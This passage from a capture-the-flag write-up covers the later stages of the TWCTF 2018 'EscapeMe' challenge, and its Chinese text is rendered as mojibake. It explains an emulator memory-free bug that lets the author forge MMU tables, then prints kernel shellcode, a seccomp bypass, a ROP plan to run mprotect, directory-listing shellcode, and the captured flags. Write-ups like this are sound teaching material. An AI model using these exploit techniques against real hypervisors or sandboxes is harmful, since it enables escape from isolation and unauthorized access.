  2. hyper callè°ƒç”¨åˆ°`for(i = 0 ~ len >> 12) pfree(paddr + (i << 12), 0x1000)`
è¿™é‡Œå…¶å®žåªè¦`pfree`åƒå†…æ ¸æƒ³çš„è¿™æ ·å·¥ä½œçš„è¯å°±æ²¡é—®é¢˜çš„ã€‚
åœ¨æ¨¡æ‹Ÿå™¨é‡Œï¼Œ`pfree(addr, len)`åŽ‹æ ¹å°±ä¸å…³å¿ƒ`len`ï¼ˆä»–çš„å‡½æ•°åœ†å½¢æ˜¯`pfree(void*))`)
æ‰€ä»¥ï¼Œå¦‚æžœæœ‰é•¿åº¦ä¸º0x2000çš„å†…å­˜addrï¼Œç„¶åŽè°ƒç”¨`munmap(addr,
0x1000)`ï¼Œå†…æ ¸å…¶å®žåªæŠŠç¬¬ä¸€é¡µunmapäº†ï¼Œä½†æ˜¯æ¨¡æ‹Ÿå™¨é‡Œï¼Œæ•´ä¸ªå†…å­˜éƒ½è¢«freeäº†ï¼
å†è¯´æ˜Žç™½ç‚¹çš„è¯ï¼Œä¹‹å‰çš„ä»£ç å¤§æ¦‚è¿™æ ·ï¼š
    shellcode = asm(
            mmap(0x7fff1ffc000, 0x2000) +
            munmap(0x7fff1ffc000, 0x1000) +
            mmap(0x217000, 0x1000)
    )
åœ¨è¿™æ®µshellcodeè¢«æ‰§è¡Œä¹‹åŽï¼Œ`0x7fff1ffc000 +
0x1000`è¿˜æ˜¯å¯ä»¥è¢«ç”¨æˆ·è®¿é—®ï¼Œä½†æ˜¯å·²ç»æŒ‡å‘äº†åˆšæ‰æ˜ å°„0x217000çš„æ—¶å€™`palloc`çš„MMU entryäº†ï¼
###  åˆ©ç”¨
å¦‚æžœæˆ‘ä»¬èƒ½å¤Ÿä¼ªé€ MMUè¡¨çš„è¯ï¼Œé‚£æ•´ä¸ªäº‹æƒ…å°±ç®€å•äº†ã€‚åœ¨ä¸€äº›è®¾ç½®ä¹‹åŽï¼Œæˆ‘çš„0x217000æ˜ å°„åˆ°äº†ç‰©ç†å†…å­˜0x0ï¼Œä¹Ÿå°±æ˜¯å†…æ ¸ä»£ç çš„åœ°å€ã€‚
çŽ°åœ¨æˆ‘ä»¬åªéœ€è¦è°ƒç”¨ä¸ª`read(0, 0x217000+off, len)`å°±å¯ä»¥æ”¹æŽ‰å†…æ ¸éƒ¨åˆ†äº†ã€‚
åœ¨æ¨¡æ‹Ÿå™¨é‡Œæœ‰ä¸ªæ¯”è¾ƒæœ‰ç”¨çš„hyper callè°ƒç”¨å¯ä»¥æŠŠä¸€ä¸ªæ–‡ä»¶è¯»åˆ°bufferé‡Œï¼Œç”¨è¿™ä¸ªå°±å¯ä»¥å¾ˆç®€å•çš„æ‹¿åˆ°flag2.txtäº†ã€‚
    kernel_sc = asm('''
            mov rdi, 0
            call sys_load_file
            movabs rdi, 0x8040000000
            add rdi, rax
            mov rsi, 100
            call sys_write
            ret
        sys_write:
            mov eax, 0x11
            mov rbx, rdi
            mov rcx, rsi
            mov rdx, 0
            vmmcall
            ret
        sys_load_file:
            mov eax, 0x30
            mov ebx, 2 /* index 2, the flag2.txt */
            mov rcx, rdi /* addr */
            mov esi, 100 /* len */
            movabs rdx, 0x0
            vmmcall
            ret
            ''')
è¿™ä¸€éƒ¨åˆ†çš„å®Œæ•´è„šæœ¬[åœ¨è¿™](https://github.com/david942j/ctf-writeups/blob/master/twctf-2018/EscapeMe/exp2.py)  
Flag2:  
`TWCTF{ABI_1nc0n51573ncy_l34d5_70_5y573m_d357ruc710n}`
## EscapeMe3: æ“çºµä¸–ç•Œ
çŽ°åœ¨å°±å‰©æœ€åŽä¸€æ­¥äº†ï¼šæŠŠæ¨¡æ‹Ÿå™¨pwnæŽ‰ã€‚  
é¦–å…ˆæˆ‘ä»¬å¾—å…ˆçœ‹çœ‹å¼€äº†é‚£äº›seccompçš„è§„åˆ™ï¼Œå¦‚æžœæƒ³åŽ»pwnæ¨¡æ‹Ÿå™¨çš„è¯ã€‚  
###  æ¼æ´ž
åœ¨EscapeMe2é‡Œæˆ‘ä»¬å·²ç»å¯ä»¥ä¼ªé€ MMUè¡¨äº†ï¼Œè¿™ä¸ªé˜¶æ®µä¹Ÿä¼šç”¨åˆ°è¿™ä¸ªã€‚MMUè¡¨é‡Œçš„ç‰©ç†åœ°å€recordå…¶å®žæ˜¯åœ¨æ¨¡æ‹Ÿå™¨é‡Œmmapçš„é¡µçš„offsetï¼Œä¹Ÿå°±æ˜¯åˆšå¥½åœ¨libc-2.27.soå‰é¢çš„é¡µã€‚æ‰€ä»¥è¯´æˆ‘ä»¬æœ‰MMUè¡¨çš„ä¼ªé€ èƒ½åŠ›ï¼Œå°±å¯ä»¥è®¿é—®åˆ°glibcé‡Œçš„å†…å­˜ã€‚
è€Œä¸”æˆ‘åœ¨é¢˜æ”¾å‡ºæ¥5åˆ†é’Ÿä¹‹å†…å°±å‘çŽ°äº†seccompè§„åˆ™é‡Œæœ‰ä¸ªbugï¼Œè¿™é‡Œç”¨åˆ°äº†æˆ‘[åŠçš„ä¸è¡Œçš„å·¥å…·seccomp-tools](https://github.com/david942j/seccomp-tools) [å¤§ç¬‘è„¸]ã€‚
Seccomp-toolsçš„æ¨¡æ‹Ÿå™¨æ¸…æ™°çš„å‘Šè¯‰æˆ‘ä»¬æ»¡è¶³`args[0] & 0xff < 7`çš„ç³»ç»Ÿè°ƒç”¨éƒ½èƒ½ç”¨ã€‚
ä¹‹åŽå°±æ²¡å•¥æ–°ä¸œè¥¿äº†ï¼Œç›´æŽ¥pwnæŽ‰å°±è¡Œäº†ã€‚
###  åˆ©ç”¨
é€šè¿‡ä¼ªé€ MMUè¡¨æˆ‘ä»¬å¯ä»¥åšåˆ°ä»»æ„å†…å­˜è®¿é—®ï¼Œä½†æ˜¯éœ€è¦å…ˆå¹²æŽ‰ASLRã€‚é€šè¿‡è¯»libcé‡Œçš„æŒ‡é’ˆå¯ä»¥åŒæ—¶leakå‡ºlibcçš„åŸºåœ°å€å’Œargvåœ°å€ï¼Œä¹‹åŽå°±å¯ä»¥å¾€æ ˆä¸Šå†™ROPé“¾äº†ã€‚
ROPé“¾ä¸»è¦ç”¨æ¥è°ƒç”¨`mprotect(stack, 0x3000, 7)`ç„¶åŽè·³åˆ°æ ˆä¸Šçš„shellcodeã€‚
å› ä¸ºæœ‰seccompçš„é™åˆ¶ï¼Œæ‰€ä»¥åœ¨`execve`ä¹‹åŽçš„syscallï¼Œæ¯”å¦‚è¯´`open`éƒ½æ²¡æ³•ç”¨ï¼Œæˆ‘ä»¬å°±æ²¡æ³•èµ·shellï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©å†™äº†ä¸ª`ls`çš„shellcodeæ¥èŽ·å–`flag3`çš„æ–‡ä»¶åã€‚
    asm('''
            /* open('.') */
            mov rdi, 0x605000
            mov rax, 0x2e /* . */
            mov [rdi], rax
            mov rax, 2
            xor rsi, rsi
            cdq
            syscall
            /* getdents */
            mov rdi, rax
            mov rax, 0x4e
            mov rsi, 0x605000
            cdq
            mov dh, 0x10
            syscall
            /* write */
            mov rdi, 1
            mov rsi, 0x605000
            mov rdx, rax
            mov rax, 1
            syscall
        '''))
è¾“å‡ºï¼š  
ä¹‹åŽå†è¯»æ–‡ä»¶`flag3-415254a0b8be92e0a976f329ad3331aa6bbea816.txt`å°±å¯ä»¥æ‹¿åˆ°æœ€ç»ˆflagäº†ã€‚
[å®Œæ•´è„šæœ¬](https://github.com/david942j/ctf-writeups/blob/master/twctf-2018/EscapeMe/exp3.p://github.com/david942j/ctf-writeups/blob/master/twctf-2018/EscapeMe/exp3.py)
Flag3:  
`TWCTF{Or1g1n4l_Hyp3rc4ll_15_4_h07b3d_0f_bug5}`
## ç»“è®º
ä»Žè¿™ä¸ªé¢˜é‡Œæˆ‘å­¦äº†ä¸å°‘KVMçš„çŸ¥è¯†ï¼ˆè™½ç„¶å¥½åƒå¯¹è¿™é¢˜æ¥è¯´æ²¡å•¥åµç”¨ï¼‰ï¼Œç„¶åŽè¿™ç§ä¸€å±‚ä¸€å±‚é€ƒé€¸çš„è®¾è®¡è¿˜æ˜¯å¾ˆä¸é”™çš„ï¼ŒæŒºå¥½çŽ©ã€‚
æˆ‘ä¹‹åŽè¿˜ä¼šå†™ç¯‡æ–‡ç« è®²è®²KVMæ˜¯æ€Žä¹ˆå·¥ä½œçš„ï¼Œä¸€æ–¹é¢å¸®æˆ‘è‡ªå·±è®°ä¸€ä¸‹ï¼ŒäºŒæ–¹é¢ä¹Ÿå¯ä»¥ä½œä¸ºKVMæ–°æ‰‹ä»‹ç»ã€‚
å†æ¬¡æ„Ÿè°¢@shift_cropsè®©æˆ‘è¿™å‘¨æœ«çŽ©çš„æŒºå¼€å¿ƒ ðŸ˜€